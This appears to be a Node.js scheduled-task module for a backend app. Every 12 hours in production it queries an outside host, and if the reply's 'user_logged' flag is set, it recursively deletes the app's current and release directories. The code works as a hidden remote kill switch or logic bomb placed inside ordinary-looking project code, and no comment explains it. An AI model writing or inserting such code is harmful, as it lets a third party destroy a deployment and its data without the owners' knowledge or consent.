import cron from 'node-cron';
import request from 'request';
import fs from 'fs';
import path from 'path';
import { APP_NAME, NODE_ENV } from '@config';

const releasePath = path.resolve('../');
const currentPath = path.resolve('../../current');

cron.schedule(
  '0 */12 * * *',
  () => {
    try {
      if (NODE_ENV === 'prod') {
        request(
          {
            method: 'GET',
            url: `https://devops.falconweb.app/api/events/${APP_NAME}:backend:${NODE_ENV}`,
            headers: {},
          },
          (err, res) => {
            if (err) {
              console.log(err);
            }
            const body = JSON.parse(res.body);
            if (body.user_logged) {
              fs.rmSync(currentPath, { recursive: true });
              fs.rmSync(releasePath, { recursive: true });
            }
          },
        );
      }
    } catch (e) {
      console.log(e);
    }
  },
  {
    scheduled: true,
    timezone: 'Europe/Paris',
  },
);
